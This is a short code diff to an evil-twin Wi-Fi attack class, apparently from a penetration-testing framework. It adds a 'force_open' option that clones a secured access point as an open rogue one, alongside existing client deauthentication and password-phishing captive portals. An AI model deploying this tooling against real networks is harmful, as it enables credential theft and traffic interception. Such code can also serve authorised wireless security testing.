@@ -60,6 +60,7 @@ class EvilTwinInput:
     ip_layer: bool = False                   # open targets only: bring up the TAP+DHCP+DNS+HTTP stack
     portal_template: PortalTemplate = PortalTemplate.PASSWORD
     clone_real_portal: bool = False          # dual-card + ip_layer only: fetch the target's actual page
+    force_open: bool = False                 # secured target: twin it open anyway, no 4-way/capture
 
 
 class EvilTwinCampaign(Campaign):
@@ -95,7 +96,8 @@ class EvilTwinCampaign(Campaign):
         self.same_bssid = self.twin_bssid == target.bssid
         self.punt_period_sec = evil_input.punt_period_sec
         self.punt_once = evil_input.punt_once
-        self.secured = bool(target.akm_suites)   # False: open target, no 4-way to forge or wait on
+        # False: open target, or a secured one deliberately twinned open -- either way no 4-way
+        self.secured = bool(target.akm_suites) and not evil_input.force_open
         self.target_client = (evil_input.target_client or "").lower() or None
         self._ip_layer_enabled = evil_input.ip_layer
         self.portal_template = evil_input.portal_template
@@ -106,7 +108,8 @@ class EvilTwinCampaign(Campaign):
         self.fetching_real_portal = False   # True only while the fetch is actually in flight
         self.real_beacon = target.last_beacon_frame
         self.twin_beacon = beacon_clone(self.real_beacon, self.twin_channel,
-                                        None if self.same_bssid else str_to_mac(self.twin_bssid))
+                                        None if self.same_bssid else str_to_mac(self.twin_bssid),
+                                        secured=self.secured)
         self.punter = self._make_punter(evil_input, target.bssid)
         self.fakeap: Optional[FakeAP] = None
         self.captured = False
